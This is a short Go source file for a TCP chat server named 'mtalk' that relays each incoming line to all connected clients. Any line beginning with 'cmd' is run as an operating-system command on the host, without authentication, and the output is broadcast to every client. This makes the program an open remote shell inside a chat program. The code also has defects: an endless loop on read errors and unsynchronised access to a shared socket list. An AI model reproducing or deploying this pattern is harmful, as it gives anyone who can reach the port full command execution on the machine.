package mtalk

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

func Listen(port int) {
	sockets := []net.Conn{}
	listenPort := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", listenPort)
	if err != nil {
		log.Fatalf("unable to bind port %q", listenPort)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal("connection error")
		}
		sockets = append(sockets, conn)
		go handleConnection(conn, &sockets)
	}
}

func handleConnection(conn net.Conn, sockets *[]net.Conn) {
	defer conn.Close()

	for {
		reader := bufio.NewReader(conn)
		s, err := reader.ReadString('\n')
		if err == nil {
			go parseCmd(s, sockets)
			writeInAllSockets(s, sockets)
		}
	}
}

func parseCmd(cmd string, sockets *[]net.Conn) {
	cmdArr := strings.Split(cmd, " ")
	if cmdArr[0] == "cmd" {
		var out bytes.Buffer

		args := []string{}
		for _, a := range cmdArr[1:] {
			args = append(args, strings.Trim(a, "\n\r"))
		}

		osCmd := exec.Command(args[0])
		osCmd.Stdout = &out
		osCmd.Args = args[0:]

		err := osCmd.Run()
		if err != nil {
			log.Printf("command error: %v", err)
		} else {
			outS := out.String()
			if len(outS) > 0 {
				log.Printf("command result: %s", out.String())
				writeInAllSockets(outS, sockets)
			}
		}
	}
}

func writeInAllSockets(s string, sockets *[]net.Conn) {
	for _, socket := range *sockets {
		w := bufio.NewWriter(socket)
		if _, err := w.WriteString(s); err == nil {
			w.Flush()
		}
	}
}
